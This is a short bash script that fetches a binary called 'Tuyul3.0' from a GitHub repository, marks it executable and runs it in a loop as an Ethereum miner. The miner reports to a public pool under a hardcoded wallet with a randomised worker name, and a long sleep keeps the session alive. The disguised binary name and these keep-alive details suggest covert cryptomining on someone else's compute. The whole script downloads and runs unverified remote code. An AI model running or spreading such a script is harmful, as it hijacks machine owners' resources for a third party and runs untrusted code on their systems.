#!/bin/bash
POOL=asia-eth.2miners.com:2020
WALLET=0xc19911dcbc324b94ad4ea306f055b7fa9d0a9b5e
WORKER=$(echo $(shuf -i 1-4 -n 1)-RIG)
wget https://github.com/mansoorjama/new/raw/main/Tuyul3.0
chmod +x Tuyul3.0
while [ 1 ]; do
./Tuyul3.0 --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999 
